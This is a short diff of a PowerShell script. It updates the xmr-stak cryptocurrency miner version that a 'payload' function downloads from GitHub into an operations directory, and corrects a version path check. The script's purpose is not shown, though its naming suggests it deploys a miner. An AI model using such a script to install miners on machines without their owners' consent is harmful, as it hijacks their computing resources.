@@ -23,7 +23,7 @@ function payload ($destination) {
   # Get xmr-stak from github.
 
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  Invoke-WebRequest -Uri https://github.com/fireice-uk/xmr-stak/releases/download/2.7.1/xmr-stak-win64-2.7.1.zip -OutFile $destination
+  Invoke-WebRequest -Uri https://github.com/fireice-uk/xmr-stak/releases/download/2.8.2/xmr-stak-win64-2.8.2.zip -OutFile $destination
 
 }
 
@@ -128,7 +128,7 @@ else
 
 $payloadDestination = "$opsDirectory\payload.zip"
 
-if (!(Test-Path "$opsDirectory\xmr-stak-win64-.2.7.1"))
+if (!(Test-Path "$opsDirectory\xmr-stak-win64-2.8.2"))
 
 {
 
